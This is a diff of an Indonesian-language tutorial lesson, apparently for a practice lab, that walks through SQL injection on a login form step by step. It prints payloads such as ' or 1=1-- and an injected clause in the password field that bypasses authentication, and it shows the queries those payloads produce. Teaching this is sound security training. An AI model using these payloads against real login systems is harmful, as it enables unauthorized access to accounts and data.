@@ -1,6 +1,6 @@
 Lesson 5
 --------
-### SQL Injection: Single Quote Test On Username Field
+### Section 8: SQL Injection: Single Quote Test On Username Field
 - **Step 1**    : Buka Login/Register
     ![](/assets/lesson-5/login-register.png)
 - **Step 2**    : Ketik `'` di kolom **Name**    
@@ -17,7 +17,7 @@ Lesson 5
         SELECT * FROM accounts WHERE username='admin' AND password='adminpass'
         ```
     
-### SQL Injection: By-Pass Password Without Username (Obtain Access #1)
+### Section 9: SQL Injection: By-Pass Password Without Username (Obtain Access #1)
 - **Step 1**    : Buka Login/Register
 - **Step 2**    : Ketik `' or 1=1-- ` di kolom **Name** dengan spasi di akhir `-- `
 - **Step 3**    : Klik Login
@@ -33,7 +33,7 @@ Lesson 5
         SELECT * FROM accounts WHERE username='' or 1=1
         ```
     
-### SQL Injection: Single Quote Test On Password Field
+### Section 9: SQL Injection: Single Quote Test On Password Field
 - **Step 1**    : Buka Login/Register.
 - **Step 2**    : Ketik `samurai` di kolom **Name**.
 - **Step 3**    : Klik Kanan di kolom **Password**.
@@ -56,7 +56,7 @@ Lesson 5
         SELECT * FROM accounts WHERE username='samurai' AND password='samurai'
         ```
         
-### SQL Injection: Single Quote Test On Password Field (Obtain Access #2)
+### Section 10: SQL Injection: Single Quote Test On Password Field (Obtain Access #2)
 - **Step 1**    : Buka Login/Register.
 - **Step 2**    : Ketik `samurai` di kolom **Name**.
 - **Step 3**    : Klik Kanan di kolom **Password**.
@@ -71,7 +71,7 @@ Lesson 5
         ![](/assets/lesson-5/password-login-admin.png)
 - **Step 8**    : Logout
 
-### SQL Injection: Single Quote Test On Password Field (Obtain Access #3)
+### Section 11: Single Quote Test On Password Field (Obtain Access #3)
 - **Step 1**    : Buka Login/Register.
 - **Step 2**    : Ketik `samurai` di kolom **Name**.
 - **Step 3**    : Klik Kanan di kolom **Password**.
@@ -113,8 +113,22 @@ Lesson 5
     ```
     select * from accounts;
     ```
-     
-- **Step 7**    : 
+     ![](/assets/lesson-5/db_table_records.png)
+- **Step 7**    : Contoh SQL Injection
+    - `select * from accounts where username = ''  and password = '';`
+    - `select * from accounts where username = 'samurai'  and password = 'samurai';`
+    - `select * from accounts where username = 'samurai'  and password = 'wrongpassword';`
+    - `select * from accounts where username = 'samurai';-- and password = 'wrongpassword';`
+    ![](/assets/lesson-5/db_query.png)
+- **Step 8**    : Mencoba hasil dari Single Quote(')
+    - `select * from accounts where username = '''  and password = '';`, dari section 8, step 2.
+    - `';`, dari section 8, step 2.
+    - `select * from accounts where username = '' or 1=1; --   and password = '';`, dari section 9, step 2.
+    - `select * from accounts where username = 'samurai' and password = '' or 1=1; -- ';`, dari section 10, step 6.
+    ![](/assets/lesson-5/db_query_1.png)
+    - `select * from accounts where username = 'samurai' and password = '' or (1=1 and username = 'samurai'); -- ';`, dari section 11, step 6.
+    ![](/assets/lesson-5/db_query_2.png)
+    
 
 
 
